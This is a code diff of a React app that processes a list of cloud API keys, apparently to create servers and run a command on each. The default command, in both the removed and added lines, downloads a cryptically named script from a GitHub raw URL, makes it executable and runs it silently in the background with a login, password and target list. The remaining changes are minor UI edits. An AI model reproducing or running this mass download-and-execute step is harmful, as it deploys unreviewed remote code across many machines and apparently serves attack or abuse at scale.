@@ -43,7 +43,6 @@ function App() {
   const [loadingState, setLoadingState] = useState({})
 
   const setLoading = (apiKey, loading) => {
-    console.log(`setting state ${loading} for ${apiKey}`)
     setLoadingState(prev => ({
       ...prev,
       [apiKey]: loading
@@ -314,7 +313,7 @@ function App() {
     exec = exec.replace('{password}', creds.password);
     exec = exec.replace('{login}', creds.login);
 
-    return exec
+    return exec.split('\n')
   }
 
   const createDroplet = apiKey => async () => {
@@ -404,8 +403,7 @@ function App() {
         <div className="row">
           <div className="col-9">
             <label className="form-label">Api key:</label>
-            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}>
-            </textarea>
+            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}/>
           </div>
           <div className="col-3">
             <label className="form-label">Login:</label>
@@ -417,7 +415,7 @@ function App() {
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <input type="text" ref={$exec} className="form-control mb-1" defaultValue={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &'} />
+            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" defaultValue={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &'} />
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
